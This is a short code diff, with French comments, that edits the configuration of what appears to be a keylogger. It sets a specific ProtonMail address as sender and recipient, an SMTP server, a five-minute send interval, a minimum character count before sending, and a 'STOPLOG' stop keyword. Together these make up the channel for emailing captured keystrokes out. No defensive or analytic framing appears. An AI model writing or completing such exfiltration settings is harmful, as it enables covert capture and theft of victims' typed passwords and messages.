@@ -48,10 +48,10 @@ CONFIG = {
     'STOP_KEYWORD': 'STOPLOG',
 }"""
 CONFIG = {
-    'EMAIL_TO': '****@proton.me',
-    'EMAIL_FROM': '****@proton.me',
-    'SMTP_SERVER': 'smtp.protonmail.ch',  # Change en 'smtp.protonmail.ch'
-    'SMTP_PORT': 587,  # Port ProtonMail
+    'EMAIL_TO': 'eustis-berru@proton.me',
+    'EMAIL_FROM': 'eustis-berru@proton.me',
+    'SMTP_SERVER': '192.168.0.1',  # Change en 'smtp.protonmail.ch'
+    'SMTP_PORT': 587,  # Port ProtonMail  #587 Port STARTTLS (recommandé) #465 Port SSL
     'USE_TLS': True,
     'SEND_INTERVAL': 300,  # Envoyer toutes les 5 minutes (secondes)
     'MIN_CHARS_TO_SEND': 100,  # Min caractères avant envoi
